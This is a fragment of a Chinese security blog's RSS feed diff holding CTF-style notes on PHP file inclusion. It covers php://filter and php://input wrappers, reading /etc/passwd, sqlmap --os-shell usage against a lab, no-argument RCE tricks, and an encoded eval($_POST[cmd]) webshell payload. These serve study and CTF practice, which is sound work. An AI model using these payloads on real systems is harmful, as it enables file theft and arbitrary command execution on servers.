+&lt;p&gt;可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为&lt;strong&gt;phar://test.test/file.txt&lt;/strong&gt;也可以运行。&lt;/p&gt;
+&lt;h3 id=&#34;3-temp&#34;&gt;&lt;a href=&#34;#3-temp&#34; class=&#34;headerlink&#34; title=&#34;3. temp:&#34;&gt;&lt;/a&gt;3. temp:&lt;/h3&gt;&lt;p&gt;一个类似文件 包装器的数据流，允许读写临时数据.会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。&lt;/p&gt;
+&lt;h3 id=&#34;4-php-x2F-x2F-filter&#34;&gt;&lt;a href=&#34;#4-php-x2F-x2F-filter&#34; class=&#34;headerlink&#34; title=&#34;4. php://filter:&#34;&gt;&lt;/a&gt;4. php://filter:&lt;/h3&gt;&lt;p&gt;(1) 一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.  php://filter/read=string.rot13/resource=123.txt&lt;/p&gt;
+&lt;p&gt;php://filter/convert.base64-decode/resource&lt;/p&gt;
+&lt;p&gt;(2) 参数设置：read用于include()和file_get_contents(),write用于file_put_contents()中。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432582.png&#34; alt=&#34;image-20200630094832964&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;①实例用法：&lt;/strong&gt; &lt;strong&gt;php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;②&lt;/strong&gt; &lt;strong&gt;php://filter/convert.base64-[encode/decode]/resource=xxx&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;php:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;filter&lt;span class=&#34;hljs-regexp&#34;&gt;/read=convert.base64-encode/&lt;/span&gt;resource=index.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这是使用的过滤器是convert.base64-encode.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据&lt;/p&gt;
+&lt;p&gt;例题：BSidesCF 2020]Had a bad day&lt;/p&gt;
+&lt;h3 id=&#34;5-php-x2F-x2F-input&#34;&gt;&lt;a href=&#34;#5-php-x2F-x2F-input&#34; class=&#34;headerlink&#34; title=&#34;5. php://input:&#34;&gt;&lt;/a&gt;5. php://input:&lt;/h3&gt;&lt;p&gt;可以访问请求的原始数据的只读流，&lt;strong&gt;将post请求的数据当作php代码执行&lt;/strong&gt;。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。enctype=”multipart/form-data时，php://input是无效的。&lt;/p&gt;
+&lt;p&gt;实例：**file=**&lt;strong&gt;php://input   hackbarPost数据&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432587.png&#34; alt=&#34;image-20200630094919052&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;6-memory&#34;&gt;&lt;a href=&#34;#6-memory&#34; class=&#34;headerlink&#34; title=&#34;6. memory:&#34;&gt;&lt;/a&gt;6. memory:&lt;/h3&gt;&lt;p&gt;是一个类似文件 包装器的数据流，允许读写临时数据，总是把数据储存在内存中&lt;/p&gt;
+&lt;p&gt;\7. file:f在双OFF的时候也可以用，用于本地文件包含注：file://协议必须是绝对路径&lt;/p&gt;
+&lt;p&gt;实例：file:// [文件的绝对路径和文件名]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Linux：&lt;/strong&gt;&lt;a href=&#34;http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd&#34;&gt;&lt;strong&gt;http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Windows：&lt;a href=&#34;http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt&#34;&gt;http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;8-zip&#34;&gt;&lt;a href=&#34;#8-zip&#34; class=&#34;headerlink&#34; title=&#34;8.zip:&#34;&gt;&lt;/a&gt;8.zip:&lt;/h3&gt;&lt;p&gt;压缩流。&lt;/p&gt;
+&lt;h3 id=&#34;9-Expect&#34;&gt;&lt;a href=&#34;#9-Expect&#34; class=&#34;headerlink&#34; title=&#34;9.Expect:&#34;&gt;&lt;/a&gt;9.Expect:&lt;/h3&gt;&lt;p&gt;处理交互式的流&lt;/p&gt;
+&lt;p&gt;总的来说就是：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432590.png&#34; alt=&#34;image-20200630094950772&#34;&gt;&lt;/p&gt;
+&lt;p&gt;gopher协议配合ssrf利用&lt;/p&gt;
+&lt;h2 id=&#34;三，常见漏洞函数&#34;&gt;&lt;a href=&#34;#三，常见漏洞函数&#34; class=&#34;headerlink&#34; title=&#34;三，常见漏洞函数&#34;&gt;&lt;/a&gt;三，常见漏洞函数&lt;/h2&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;、&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;、&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include_once&lt;/span&gt;、&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;require_once&lt;/span&gt;、&lt;br&gt;highlight_file 、&lt;br&gt;show_source 、&lt;br&gt;readfile 、&lt;br&gt;file_get_contents 、&lt;br&gt;fopen 、&lt;br&gt;file&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;敏感目录：file=/etc/apache2/apache2.conf&lt;/p&gt;
+&lt;h2 id=&#34;漏洞修复&#34;&gt;&lt;a href=&#34;#漏洞修复&#34; class=&#34;headerlink&#34; title=&#34;漏洞修复&#34;&gt;&lt;/a&gt;漏洞修复&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429150.png&#34; alt=&#34;image-20221030144318465&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;File=php://filter:[payload]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;概念：源封装器，用于数据流打开时的筛选过滤应用。&lt;/li&gt;
+&lt;li&gt;配合函数：readfile，file，file_get_contents进行读取&lt;/li&gt;
+&lt;li&gt;payload：file=php://filter/read=convert.base64-encode/resource=flag.php&lt;/li&gt;
+&lt;li&gt;可选择各种编码获取读出的内容：&lt;/li&gt;
+&lt;li&gt;注意：在file_put_content函数中第一个参数时输出内容的文件名，也可以使用伪协议将任何输入该文件的内容都进行解码或编码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;File=php://input;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;要求allow_url_include必须是on的情况，此时直接post任何内容都会被当作php代码执行&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Include 函数的参数可以是file协议，能够通过该方式读取文件绝对路径，将内容视为php代码执行&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;SQLMAP玩法&#34;&gt;&lt;a href=&#34;#SQLMAP玩法&#34; class=&#34;headerlink&#34; title=&#34;SQLMAP玩法&#34;&gt;&lt;/a&gt;SQLMAP玩法&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429887.png&#34; alt=&#34;image-20221030144328542&#34;&gt;&lt;/p&gt;
+&lt;p&gt;SQLmap玩法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;sqlmap -u “&lt;a href=&#34;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&#34;&gt;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&lt;/a&gt;“ –tables 查询表名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;sqlmap -u “&lt;a href=&#34;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&#34;&gt;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&lt;/a&gt;“ –db 用于查询当前的数据库&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;sqlmap -u “&lt;a href=&#34;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&#34;&gt;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&lt;/a&gt;“ –os-shell 获取目标主机的shell&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;sqlmap -u “&lt;a href=&#34;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&#34;&gt;http://192.168.234.1/sqli-labs-master/Less-1/?id=5&lt;/a&gt;“ -D “security” –tables&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;-samrt 用于智能测试目标主机的情况.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;其中的dump是用于读出来全部的数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;判断数据库类型：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;常见规律：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;php : Mysql&lt;/p&gt;
+&lt;p&gt;jsp : Oracle&lt;/p&gt;
+&lt;p&gt;挖过哪些漏洞？&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;越权，弱口令，xss&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;修复文件包含？&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用open_basedir()配置限制访问在指定的区域&lt;/li&gt;
+&lt;li&gt;过滤特殊字符，尽量关闭allow_url_include&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;命令注入&#34;&gt;&lt;a href=&#34;#命令注入&#34; class=&#34;headerlink&#34; title=&#34;命令注入&#34;&gt;&lt;/a&gt;命令注入&lt;/h1&gt;&lt;h3 id=&#34;无参数RCE&#34;&gt;&lt;a href=&#34;#无参数RCE&#34; class=&#34;headerlink&#34; title=&#34;无参数RCE&#34;&gt;&lt;/a&gt;无参数RCE&lt;/h3&gt;&lt;p&gt;[&lt;a href=&#34;https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE]&#34;&gt;https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE]&lt;/a&gt;(&lt;a href=&#34;https://skysec.top/2019/03/2&#34;&gt;https://skysec.top/2019/03/2&lt;/a&gt;	9/PHP-Parametric-Function-RCE/#什么是无参数函数RCE)&lt;/p&gt;
+&lt;h3 id=&#34;current-localeconv&#34;&gt;&lt;a href=&#34;#current-localeconv&#34; class=&#34;headerlink&#34; title=&#34;current(localeconv())&#34;&gt;&lt;/a&gt;current(localeconv())&lt;/h3&gt;&lt;hr&gt;
+&lt;p&gt;该函数得到的内容永远是点&lt;/p&gt;
+&lt;figure class=&#34;highlight lisp&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs lisp&#34;&gt;scandir(&lt;span class=&#34;hljs-name&#34;&gt;current&lt;/span&gt;(&lt;span class=&#34;hljs-name&#34;&gt;localeconv&lt;/span&gt;()))&lt;span class=&#34;hljs-comment&#34;&gt;; &lt;/span&gt;&lt;br&gt;print_r(&lt;span class=&#34;hljs-name&#34;&gt;scandir&lt;/span&gt;(&lt;span class=&#34;hljs-name&#34;&gt;pos&lt;/span&gt;(&lt;span class=&#34;hljs-name&#34;&gt;localeconv&lt;/span&gt;())))&lt;span class=&#34;hljs-comment&#34;&gt;; #  即这两个表达式会返回当前的目录内容&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h3 id=&#34;常见命令注入操作函数&#34;&gt;&lt;a href=&#34;#常见命令注入操作函数&#34; class=&#34;headerlink&#34; title=&#34;常见命令注入操作函数&#34;&gt;&lt;/a&gt;常见命令注入操作函数&lt;/h3&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(),&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;readfile&lt;/span&gt;(),&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 读取文件内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getcwd&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 用于获取当前目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;scandir&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getcwd&lt;/span&gt;()) &lt;span class=&#34;hljs-comment&#34;&gt;# 配合scandir即可得到当前的目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;dirname&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 用于返回当前所在的文件夹&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;chdir&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;dirname&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getcwd&lt;/span&gt;()))  &lt;span class=&#34;hljs-comment&#34;&gt;# 即可切换到上一个文件夹目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;array_flip&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 对数组中的值和键进行翻转&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;array_reverse&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 将数组中的元素顺序进行翻转&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;prev&lt;/span&gt;() - 将内部指针指向数组中的上一个元素，并输出&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;current&lt;/span&gt;() - 返回数组中的当前元素的值&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;next&lt;/span&gt;() - 返回数组中的下一个元素&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;end&lt;/span&gt;() - 将内部指针指向数组中的最后一个元素，并输出&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;reset&lt;/span&gt;() - 将内部指针指向数组中的第一个元素，并输出&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;each&lt;/span&gt;() - 返回当前元素的键名和键值，并将内部指针向前移动&lt;br&gt;apache2 专属函数 &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getallheaders&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 获取http请求头的内容并返回一个数组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;hex2bin&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;session_id&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;session_start&lt;/span&gt;()))) &lt;span class=&#34;hljs-comment&#34;&gt;# 执行Cookie中传入的PHPSESSID 的值，但需要进行十六进制编码&lt;/span&gt;&lt;br&gt;    &lt;br&gt;{}可以用来代替[]&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;base_convert&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;37907361743&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt;)  &lt;span class=&#34;hljs-comment&#34;&gt;# 将第一个字符串从 十进制转换为36进制，此处的转换结果为hex2bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;hex2bin&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 将16进制转换为字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;dechex&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 将其中的函数转换为16进制，转换的时候是直接转换 0x5f474554  - &amp;gt; int(0x5f474554) 1598506324&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;base_convert&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;37907361743&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt;)(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;dechex&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1598506324&lt;/span&gt;));&lt;span class=&#34;hljs-variable&#34;&gt;$$pi&lt;/span&gt;{abs}(&lt;span class=&#34;hljs-variable&#34;&gt;$$pi&lt;/span&gt;{asin}) &lt;span class=&#34;hljs-comment&#34;&gt;# $_GET[abs]($_GET[asin]) 即可进行任意命令执行&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;getallheaders&lt;/span&gt;() &lt;span class=&#34;hljs-comment&#34;&gt;# 获取消息头部   getallheaders(){1} 即可获得键为1的消息头部值，此时在消息头部写上1:cat /flag即可得到字符串&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;($$pi){pi}(($$pi){abs})&amp;amp;pi=system&amp;amp;abs=cat+/flag  77763910388090860000&lt;/p&gt;
+&lt;h3 id=&#34;编码注入&#34;&gt;&lt;a href=&#34;#编码注入&#34; class=&#34;headerlink&#34; title=&#34;编码注入&#34;&gt;&lt;/a&gt;编码注入&lt;/h3&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;a=′assert′;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;echourlencode&lt;/span&gt;( a).&lt;span class=&#34;hljs-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;;&lt;br&gt;b=′(&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(_POST[cmd]))&lt;span class=&#34;hljs-string&#34;&gt;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;echo urlencode(~$b).&#34;\n&#34;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;# 生成字符串(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;对于字符的绕过&#34;&gt;&lt;a href=&#34;#对于字符的绕过&#34; class=&#34;headerlink&#34; title=&#34;对于字符的绕过&#34;&gt;&lt;/a&gt;对于字符的绕过&lt;/h2&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;ip2long&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;47.100.33.58&#39;&lt;/span&gt;)&lt;br&gt; &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# 使用以上代码得到的内容依然可以访问&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 id=&#34;PHP执行绕过&#34;&gt;&lt;a href=&#34;#PHP执行绕过&#34; class=&#34;headerlink&#34; title=&#34;PHP执行绕过&#34;&gt;&lt;/a&gt;PHP执行绕过&lt;/h2&gt;&lt;figure class=&#34;highlight x86asm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs x86asm&#34;&gt;tar cvf &lt;span class=&#34;hljs-keyword&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1.&lt;/span&gt;php 将&lt;span class=&#34;hljs-number&#34;&gt;1.&lt;/span&gt;php打包为&lt;span class=&#34;hljs-keyword&#34;&gt;test&lt;/span&gt;，使用PHP执行&lt;span class=&#34;hljs-keyword&#34;&gt;test&lt;/span&gt;即可运行其中的代码&lt;br&gt;&lt;br&gt;tar cvf &lt;span class=&#34;hljs-number&#34;&gt;aech&lt;/span&gt; /目录  将其打包但是不压缩，其中的代码依然会明文保存，使用php &lt;span class=&#34;hljs-number&#34;&gt;aech&lt;/span&gt;依然会执行&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://alazymechnaic.github.io/2024/03/04/php-lou-dong-han-shu/</guid>
+            <title>PHP漏洞函数</title>
+            <link>https://alazymechnaic.github.io/2024/03/04/php-lou-dong-han-shu/</link>
+            <pubDate>Mon, 04 Mar 2024 14:32:51 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;is-numeric&#34;&gt;&lt;a href=&#34;#is-numeric&#34; class=&#34;headerlink&#34; title=&#34;is_numeric()&#34;&gt;&lt;/a&gt;is_numeric()&lt;/h2&gt;&lt;hr&gt;
